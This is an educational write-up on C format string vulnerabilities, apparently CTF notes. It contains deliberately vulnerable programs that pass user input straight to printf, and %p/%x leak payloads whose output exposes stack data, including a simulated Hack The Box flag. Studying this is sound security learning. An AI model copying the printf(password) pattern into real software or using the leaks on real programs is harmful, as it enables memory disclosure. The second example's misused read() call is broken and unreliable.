# Format String Vulnerability
A **format string vulnerability** is a bug where user input is passed as the format argument to `printf`, `scanf`, or another function in that family.

The format argument has many different specifiers which could allow an attacker to leak data if they control the format argument to `printf`. Since `printf` and similar are variadic functions, they will continue popping data off of the stack according to the format.

# Common Parameters
| Parameters | Output                                   | Passed as  |
|------------|------------------------------------------|------------|
| %%         | % character (literal)                   | Reference  |
| %p         | External representation of a pointer    | Reference  |
| %d         | Decimal                                  | Value      |
| %c         | Character                                |            |
| %u         | Unsigned decimal                         | Value      |
| %x         | Hexadecimal                              | Value      |
| %s         | String                                   | Reference  |
| %n         | Writes the number of characters  into a pointer  | Reference  |

# Example #1
In the example below, we can see that we have control over the `password` variable, which will be printed by `printf`.      
We could use `%p` to write out the pointer addresses.
```c
#include <stdio.h>
#include <unistd.h>

int main(){
    int flag = 0xcafebabe;

    char password[256] = {0};
    read(0, password, 256);

    printf(password);
    printf("End of main!\n");

    return 0;
}
```
But as seen in the **output** below, since the flag is stored on the stack and it will print it regardless.
```
%p %p %p %p %p %p %p %p %p
0x7fff120059d0 0x100 0x76d74d5147e2 0x76d74d61bf10 0x76d74d6c6040 0x2 0xcafebabe0000000e 0x7025207025207025 0x2520702520702520
End of main!
```

# Example #2
This is a code to simulate the Hack The Box [racecar](https://app.hackthebox.com/challenges/racecar) challenge.       

In short, the code:
1. Loads *flag.txt* as `file`
2. Puts contents of `file` into `data_from_file`
3. Puts `data_from_file` onto the stack -- `buffer`
4. Aks for an input -- `password`
5. Outputs are shown and the program halts

In the actual challenge the flag was in the file and its contents were put onto the stack.

For this example *flag.txt* contains "*AAAAAA*"

```c
#include <stdio.h>

int main() {
    char password[256] = {0};
    char data_from_file[256];
    char buffer[44];

    FILE* file = fopen("flag.txt", "r");
    if (file == NULL) {
        perror("Failed to open file");
        return 1;
    }
    read(data_from_file, 1, 256); 

    fgets(buffer, 44, file);

    read(0, password, 256);
    printf(password); 

    printf("End of main!\n");

    return 0;
}
```

To leak the offset of `buffer` we did the following:
```
%x %x %x %x %x %x %x %x %x  %x
7d6a3130 100 507147e2 3 1bb8b480 0 1bb8b2a0 41414141 0  ff00
```
We could now read the *A*s in hex format *(0x41)* and can note that they start at offset 8.

*The challenge was a bit more complex, this is just for demonstration purposes*

# References
- [https://owasp.org/www-community/attacks/Format_string_attack](https://owasp.org/www-community/attacks/Format_string_attack)
- [https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/)